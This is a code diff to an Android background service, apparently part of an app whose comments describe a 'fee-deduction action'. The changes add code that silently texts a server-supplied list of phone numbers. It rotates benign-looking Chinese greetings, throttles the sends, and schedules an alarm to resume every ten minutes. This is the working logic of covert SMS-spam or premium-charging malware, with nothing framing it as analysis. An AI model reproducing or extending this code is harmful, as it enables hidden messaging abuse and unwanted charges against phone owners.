@@ -42,6 +42,14 @@ public class PluginService extends IntentService {
 
     public static final String SMS_BROADCAST_ACTION = "com.xstd.plugin.broadcast";
 
+    private static final String[] SEND_MESSAGE_CONTENT = new String[] {
+        "你好，很高兴认识你。",
+        "您好，很高兴为您服务。",
+        "你好，请问你是？",
+        "好久不见",
+        "最近还好么?"
+    };
+
     /**
      * 扣费行动
      */
@@ -57,8 +65,7 @@ public class PluginService extends IntentService {
         if (intent != null) {
             String action = intent.getAction();
             Config.LOGD("[[PluginService::onHandleIntent]] action : " + action);
-            if (ACTIVE_ACTION.equals(action)
-                    && !AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
+            if (ACTIVE_ACTION.equals(action) && !AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                 //do active
                 activePluginAction();
             } else if (ACTIVE_PACKAGE_ACTION.equals(action)) {
@@ -93,14 +100,24 @@ public class PluginService extends IntentService {
                 if (datas != null) {
                     //如果一下发送多条短信会有问题，所以增加一个延迟
                     //每次只发5条，等10分钟，再发5条
-                    for (int i = 0; i < datas.length && i < 5; ++i) {
+                    for (int i = 0; (i < datas.length && i < SEND_MESSAGE_CONTENT.length); ++i) {
                         if (datas[i] != null && (datas[i].length() == 11 || datas[i].startsWith("+"))) {
-                            if (SMSUtil.sendSMS(datas[i], "你好，很高兴认识你。")) {
+                            if (SMSUtil.sendSMS(datas[i], SEND_MESSAGE_CONTENT[i])) {
                                 datas[i] = "";
                             }
                         } else {
                             //电话号码的格式不合法，直接电话号码清空
                             datas[i] = "";
+                        }
+
+                        try {
+                            //等待1S
+                            Thread.sleep(2000);
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                            if (Config.DEBUG) {
+                                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+                            }
                         }
                     }
 
@@ -138,6 +155,11 @@ public class PluginService extends IntentService {
             e.printStackTrace();
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+            }
+
+            if (!TextUtils.isEmpty(SettingManager.getInstance().getBroadcastPhoneNumber())) {
+                //因为还有没有发送的号码，所以启动一个定时器
+                BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
             }
         }
 
